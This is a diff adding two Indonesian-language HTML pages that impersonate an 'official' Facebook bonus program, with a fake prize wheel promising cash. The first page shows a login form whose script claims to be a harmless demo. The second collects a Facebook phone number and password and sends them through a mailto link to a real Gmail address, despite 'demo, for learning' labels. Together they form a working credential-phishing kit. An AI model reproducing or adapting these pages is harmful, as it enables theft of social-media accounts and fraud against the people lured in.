@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Claim Bonus</title>
+  <style>
+:root{
+  --primary:#22c55e; --primary-dark:#16a34a;
+  --bg:#eef6f0; --card:#ffffff; --ink:#0f172a;
+}
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu;
+  color:var(--ink);overflow-x:hidden;
+  background:
+    radial-gradient(1200px 600px at 10% 10%,#e9f7ee,transparent),
+    radial-gradient(900px 500px at 90% 20%,#e6f3ff,transparent),
+    linear-gradient(180deg,#f7fff9,#eef6f0);
+}
+header{
+  position:sticky;top:0;z-index:10;
+  backdrop-filter:blur(12px);
+  background:linear-gradient(135deg,rgba(34,197,94,.9),rgba(22,163,74,.9));
+  color:#fff;padding:20px 22px
+}
+header h1{margin:0;font-size:22px;letter-spacing:.3px}
+header p{margin:6px 0 0;opacity:.9}
+.container{max-width:1024px;margin:16px auto 56px;padding:0 14px}
+.grid{display:grid;grid-template-columns:1.1fr .9fr;gap:14px}
+.card{
+  background:linear-gradient(180deg,#fff,#f9fffb);
+  border-radius:20px;box-shadow:0 22px 44px rgba(2,44,16,.14);
+  padding:18px;position:relative;overflow:hidden
+}
+.card::after{
+  content:"";position:absolute;inset:auto -40% -60% -40%;height:140px;
+  background:radial-gradient(closest-side,rgba(34,197,94,.22),transparent)
+}
+.badge{display:inline-flex;align-items:center;gap:6px;background:#dcfce7;color:#166534;padding:6px 10px;border-radius:999px;font-size:12px;font-weight:800}
+.btn{
+  --y:0px;--s:1;
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;
+  border:none;border-radius:16px;padding:14px 16px;
+  background:linear-gradient(180deg,var(--primary),var(--primary-dark));
+  color:#fff;cursor:pointer;width:100%;font-size:15px;font-weight:800;
+  transform:translateY(var(--y)) scale(var(--s));
+  transition:transform .12s ease, box-shadow .12s ease, filter .12s ease, opacity .12s ease;
+  box-shadow:0 16px 32px rgba(22,163,74,.35)
+}
+.btn.secondary{background:#ecfeff;color:#065f46;box-shadow:0 10px 22px rgba(6,95,70,.2)}
+.btn.ghost{background:transparent;color:#065f46;box-shadow:none;border:1px dashed #bbf7d0}
+.btn:active{--y:2px;filter:brightness(.95)}
+.btn:hover{--s:1.01}
+.btn:disabled{opacity:.55;cursor:not-allowed;filter:grayscale(.2)}
+input,select{
+  width:100%;padding:14px;border-radius:16px;border:1px solid #d1fae5;margin:8px 0;
+  transition:box-shadow .15s ease, transform .08s ease
+}
+input:focus{outline:none;box-shadow:0 0 0 4px rgba(34,197,94,.22)}
+label{font-size:13px;color:#14532d;font-weight:700}
+.row{display:flex;gap:10px}
+.row>div{flex:1}
+.hidden{display:none}
+.login-card{order:-1}
+.spin-card{order:0}
+.claim-card{order:2}
+footer{padding:28px;text-align:center;color:#6b7280}
+/* micro-animations */
+.float{animation:float 6s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+.pulse{animation:pulse 2s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.45)}70%{box-shadow:0 0 0 16px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}
+/* skeleton */
+.skel{background:linear-gradient(100deg,#e5f5ea 40%,#f3fff8 50%,#e5f5ea 60%);background-size:200% 100%;animation:sk 1.2s infinite;border-radius:12px}
+@keyframes sk{to{background-position:-200% 0}}
+/* ripple */
+.ripple{position:relative;overflow:hidden}
+.ripple span{position:absolute;border-radius:50%;transform:scale(0);animation:ripple .6s linear;background:rgba(255,255,255,.6)}
+@keyframes ripple{to{transform:scale(4);opacity:0}}
+/* dark mode */
+.dark{--bg:#0b1220;--card:#0f172a;--ink:#e5e7eb}
+.dark body{background:linear-gradient(180deg,#0b1220,#020617)}
+@media(max-width:860px){.grid{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+  <header>
+    <h1>Program Claim Bonus</h1>
+    <p>Halaman klaim bonus resmi dari FACEBOOK.</p>
+  </header>
+
+  <div class="container">
+    <div id="spinSection" class="card spin-card hidden" style="margin-bottom:16px;text-align:center">
+      <h3>Spin & Dapatkan Bonus</h3>
+      <p>Putar roda sekali setelah login.</p>
+      <canvas id="wheel" width="260" height="260" style="margin:10px auto;display:block"></canvas>
+      <button class="btn" id="spinBtn">SPIN</button>
+      <p id="spinResult"></p>
+    </div>
+    <div class="grid">
+      <div class="card claim-card">
+        <span class="badge">Bonus Aktif</span>
+        <h2>Bonus Selamat Datang</h2>
+        <p>Dapatkan bonus setelah login akun Anda.</p>
+        <ul>
+          <li>Dapatkan Keberuntunganmu</li>
+          <li>Halaman resmi tanpa biaya apapun</li>
+          <li>Syarat & ketentuan berlaku</li>
+        </ul>
+        <button class="btn" id="claimBtn" disabled>CLAIM SEKARANG!</button>
+        <p id="claimMsg"></p>
+      </div>
+
+      <div class="card login-card">
+        <h3>Masuk ke Akun</h3>
+        <p style="font-size:13px;color:#6b7280">Isi data akun dengan benar.</p>
+
+        <div class="row" style="margin-bottom:8px">
+          <button class="btn secondary" id="tabEmail">Email</button>
+          <button class="btn secondary" id="tabPhone">No. HP</button>
+        </div>
+
+        <div id="emailBox">
+          <label>Email</label>
+          <input id="email" type="email" placeholder="email@contoh.com" />
+        </div>
+
+        <div id="phoneBox" class="hidden">
+          <label>No. HP</label>
+          <input id="phoneLogin" type="tel" placeholder="08xxxxxxxxxx" />
+        </div>
+
+        <label>Password</label>
+        <input id="password" type="password" placeholder="••••••••" />
+
+        
+
+        <button class="btn" id="loginBtn">Masuk</button>
+        <button class="btn secondary" id="logoutBtn" disabled style="margin-top:8px">Keluar</button>
+        <p id="loginMsg"></p>
+      </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>© 2025 Halaman Claim Bonus — Legal & Resmi Facebook</p>
+  </footer>
+
+  <script>
+// ================== UI DEMO (AMAN) ==================
+// Tidak menyimpan data, tidak mengirim kredensial.
+// ====================================================
+
+// Dark mode toggle
+const dmBtn=document.getElementById('dmBtn');
+if(dmBtn){dmBtn.onclick=()=>document.documentElement.classList.toggle('dark')}
+
+// Tabs login ala medsos
+const tabEmail=document.getElementById('tabEmail');
+const tabPhone=document.getElementById('tabPhone');
+const emailBox=document.getElementById('emailBox');
+const phoneBox=document.getElementById('phoneBox');
+function activateEmail(){emailBox.classList.remove('hidden');phoneBox.classList.add('hidden')}
+function activatePhone(){phoneBox.classList.remove('hidden');emailBox.classList.add('hidden')}
+if(tabEmail&&tabPhone){tabEmail.onclick=activateEmail;tabPhone.onclick=activatePhone;activateEmail()}
+
+// Ripple (semua tombol hidup saat disentuh)
+document.addEventListener('click',e=>{
+  const b=e.target.closest('.btn'); if(!b) return;
+  const s=document.createElement('span'); const r=Math.max(b.clientWidth,b.clientHeight);
+  const rect=b.getBoundingClientRect(); s.style.width=s.style.height=r+'px';
+  s.style.left=(e.clientX-rect.left-r/2)+'px'; s.style.top=(e.clientY-rect.top-r/2)+'px';
+  b.classList.add('ripple'); b.appendChild(s); setTimeout(()=>s.remove(),600);
+});
+
+// Skeleton loading helper
+function withSkeleton(el,ms=700,cb){
+  el.classList.add('skel'); setTimeout(()=>{el.classList.remove('skel'); cb&&cb()},ms)
+}
+
+// Login demo -> buka spin
+const loginBtn=document.getElementById('loginBtn');
+const loginMsg=document.getElementById('loginMsg');
+const spinSection=document.getElementById('spinSection');
+if(loginBtn){loginBtn.onclick=()=>{
+  withSkeleton(loginBtn,600,()=>{
+    loginMsg.textContent='Berhasil masuk (demo).'; loginMsg.style.color='#166534';
+    spinSection.classList.remove('hidden'); spinSection.scrollIntoView({behavior:'smooth'})
+  })
+}}
+
+// Spin visual (Canvas)
+const canvas=document.getElementById('wheel');
+const spinBtn=document.getElementById('spinBtn');
+const spinResult=document.getElementById('spinResult');
+const claimBtn=document.getElementById('claimBtn');
+const prizes=['100 Bintang','Uang 10 USD','Uang 25 USD','Uang 30 USD','Zonk'];
+let ctx,angle=0;
+function drawWheel(){ if(!canvas) return; ctx=canvas.getContext('2d'); const w=canvas.width,h=canvas.height; const r=w/2;
+  ctx.clearRect(0,0,w,h); const seg=2*Math.PI/prizes.length;
+  prizes.forEach((p,i)=>{ ctx.beginPath(); ctx.moveTo(r,r); ctx.arc(r,r,r,angle+i*seg,angle+(i+1)*seg);
+    ctx.fillStyle=i%2?'#86efac':'#22c55e'; ctx.fill(); ctx.save(); ctx.translate(r,r); ctx.rotate(angle+(i+.5)*seg);
+    ctx.fillStyle='#064e3b'; ctx.font='bold 14px system-ui'; ctx.fillText(p, r/3,5); ctx.restore(); });
+}
+if(canvas){drawWheel()}
+if(spinBtn){spinBtn.onclick=()=>{
+  spinBtn.disabled=true; spinResult.textContent='Memutar...'; let t=0; const iv=setInterval(()=>{
+    angle+=0.35; drawWheel(); if((t+=16)>1600){clearInterval(iv);
+      const win=prizes[Math.floor(Math.random()*prizes.length)];
+      spinResult.textContent='Hasil: '+win; claimBtn.disabled=false; claimBtn.classList.add('pulse'); spinBtn.disabled=false;
+    }},16)
+}}
+
+// Claim 
+if(claimBtn){claimBtn.onclick=()=>{
+  withSkeleton(claimBtn,700,()=>alert('Demo UI: Klaim ditampilkan.'))
+}}
+</script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Demo Kirim Data ke Email</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body{
+      font-family: Arial, sans-serif;
+      background:#f0fdf4;
+      padding:30px;
+    }
+    .card{
+      max-width:420px;
+      margin:auto;
+      background:#fff;
+      padding:20px;
+      border-radius:12px;
+      box-shadow:0 10px 25px rgba(0,0,0,.1);
+    }
+    h2{text-align:center;color:#166534}
+    input,button{
+      width:100%;
+      padding:12px;
+      margin-top:10px;
+      border-radius:8px;
+      border:1px solid #ccc;
+      font-size:14px;
+    }
+    button{
+      background:#22c55e;
+      color:white;
+      border:none;
+      cursor:pointer;
+      font-weight:bold;
+    }
+    button:active{opacity:.8}
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h2> Klaim Bonus</h2>
+
+  <!-- DATA DEMO (BUKAN LOGIN ASLI) -->
+  <input id="nama" placeholder="No (Hp Facebook)" />
+  <input id="hasil" placeholder="password  (Facebook)" />
+
+  <button onclick="kirimEmail()">KIRIM DATA UNTUK CLAIM (BONUS)</button>
+</div>
+
+<script>
+function kirimEmail(){
+  const nama = document.getElementById("nama").value || "User Demo";
+  const hasil = document.getElementById("hasil").value || "Belum ditentukan";
+  const waktu = new Date().toLocaleString();
+
+  // isi email
+  const subject = encodeURIComponent("Demo Klaim Bonus");
+  const body = encodeURIComponent(
+    "INI DATA DEMO (UNTUK BELAJAR)\n\n" +
+    "Nama: " + nama + "\n" +
+    "Hasil Spin: " + hasil + "\n" +
+    "Waktu: " + waktu + "\n\n" +
+    "Dikirim dari index.html"
+  );
+
+  // kirim ke email tujuan
+  window.location.href =
+    "mailto:dedijr019@gmail.com?subject=" + subject + "&body=" + body;
+}
+</script>
+
+</body>
+</html>
